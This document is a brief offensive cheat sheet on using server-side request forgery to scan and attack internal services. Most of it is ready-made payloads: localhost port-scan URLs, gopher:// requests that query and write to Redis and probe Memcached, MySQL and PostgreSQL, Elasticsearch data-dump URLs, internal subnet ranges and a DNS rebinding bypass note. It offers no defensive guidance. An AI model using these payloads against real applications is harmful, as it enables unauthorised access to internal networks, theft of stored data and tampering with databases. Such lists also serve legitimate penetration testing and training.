# SSRF Internal Network Pivoting

## Port Discovery via SSRF

### Quick Port Scan
```
http://127.0.0.1:80
http://127.0.0.1:443
http://127.0.0.1:8080
http://127.0.0.1:8443
http://127.0.0.1:3000
http://127.0.0.1:5000
http://127.0.0.1:9200
http://127.0.0.1:27017
http://127.0.0.1:6379
http://127.0.0.1:3306
http://127.0.0.1:5432
http://127.0.0.1:11211
```

### Detection by Response
- Port open + service banner → service identified
- Port open + timeout → service exists but no banner
- Connection refused → port closed
- Different timeout → firewall/filtered

## Internal Service Exploitation

### Redis (6379)
```
gopher://127.0.0.1:6379/_INFO%0D%0A
gopher://127.0.0.1:6379/_SET%20pwned%20true%0D%0A
```

### Memcached (11211)
```
gopher://127.0.0.1:11211/_stats%0D%0A
```

### Elasticsearch (9200)
```
http://127.0.0.1:9200/_cat/indices
http://127.0.0.1:9200/_search?q=*
```

### MongoDB (27017)
```
mongodb://127.0.0.1:27017/
```

### MySQL (3306)
```
gopher://127.0.0.1:3306/
```

### PostgreSQL (5432)
```
gopher://127.0.0.1:5432/
```

## Subnet Discovery
```
# Common internal subnets
10.0.0.0/8
172.16.0.0/12
192.168.0.0/16
10.10.10.0/24
10.10.11.0/24
```

## DNS Rebinding for Internal Access
```
# Bypass SSRF protection that resolves DNS first
# Domain alternates between attacker IP and internal IP
```
